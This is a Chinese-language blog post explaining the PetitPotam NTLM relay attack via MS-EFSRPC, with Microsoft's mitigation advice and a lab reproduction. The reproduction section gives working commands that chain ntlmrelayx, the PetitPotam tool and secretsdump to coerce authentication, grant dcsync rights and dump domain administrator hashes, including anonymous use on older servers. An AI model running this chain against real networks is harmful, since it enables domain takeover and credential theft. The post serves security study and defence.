​​​​​​​​​​​​​​2021年7月19日，法国安全研究人员Gilles Lionel披露了一种新型的NTLM Relay攻击利用手法——PetitPotam。该漏洞利用了微软[加密](https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020)文件系统远程协议（MS-EFSRPC，MicroSoft Encrypting File System Remote Protocol）。MS-EFSRPC是 Microsoft 的加密文件系统远程协议，用于对远程存储和通过网络访问的加密数据执行“维护和管理操作”。利用该漏洞，黑客通过连接到LSARPC强制触发目标机器向指定远程服务器发送Net-NTLM Hash，从而攻击者在拿到Net-NTLM Hash后能进行NTLM Relay攻击，进而接管整个域。该漏洞可以用于替代Printerbug。

项目地址：[GitHub - topotam/PetitPotam: PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.](https://github.com/topotam/PetitPotam "GitHub - topotam/PetitPotam: PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.")

![](https://img-blog.csdnimg.cn/img_convert/d9a3d530d81c21fc4fa77c31b0051581.png)

虽然禁用对 MS-EFSRPC 的支持并不能阻止攻击运行，但微软随后发布了针对该问题的缓解措施，同时将“PetitPotam”描述为“经典的 NTLM 中继攻击”，它允许匿名(低版本系统)/具有网络访问权限的攻击者拦截合法客户端和服务器之间的身份验证流量，并中继那些经过验证的身份验证请求以访问网络服务。

微软指出：“为了防止在启用了 NTLM 的网络上发生 NTLM 中继攻击，域管理员必须确保允许 NTLM 身份验证的服务使用诸如扩展身份验证保护 (EPA) 或签名功能（如 SMB 签名）之类的保护措施。” 

### 漏洞复现

这里以CVE-2019-1040 NTLM 降级漏洞作为一个演示。

首先使用ntlmrelayx脚本进行监听

```
python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://10.211.55.4 -smb2support
```


*   \--remove-mic选项用于清除MIC标志
*   \--escalate-user用于赋予指定用户dcsync权限

*   \-smb2support 用于支持SMB2协议
*   \-t 将认证凭据中继到指定ldap

![](https://img-blog.csdnimg.cn/img_convert/3ebef447d41a7baeb2f42b59d83a9bf1.png)

然后使用Petitpotam脚本进行攻击，第一个ip是回调的ip，第二个ip是攻击目标的ip。

```
python3 Petitpotam.py -d xie.com -u hack -p P@ss1234 10.211.55.2 10.211.55.5
```


![](https://img-blog.csdnimg.cn/img_convert/b318d391ffae75c253a37667a5ca9346.png)

或者使用exe进行攻击，需要在域内机器上执行该exe

```
PetitPotam.exe 10.211.55.2 10.211.55.5
```


![](https://img-blog.csdnimg.cn/img_convert/1d1816e6a7bf292d885c599fdd6f892e.png)

攻击成功后即可利用。

```
python3 secretsdump.py xie.com/hack:P@ss1234@10.211.55.4 -dc-ip 10.211.55.4 -just-dc-user administrator
```


如下图是攻击前和攻击后，攻击后hack用户即拥有导出域内所有用户哈希的权限。

![](https://img-blog.csdnimg.cn/img_convert/3567e9b545e12b2df8a753dfe4c36eec.png)

注：对于Windows Server2016以下的机器，可以匿名进行攻击。

```
python3 Petitpotam.py -d '' -u '' -p '' 10.211.55.2 10.211.55.5
```


  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[微软分享缓解PetitPotam NTML中继攻击的方法](https://new.qq.com/omn/20210726/20210726A04ZCV00.html "微软分享缓解PetitPotam NTML中继攻击的方法")

[【安全研究】使用PetitPotam代替Printerbug](https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ "【安全研究】使用PetitPotam代替Printerbug")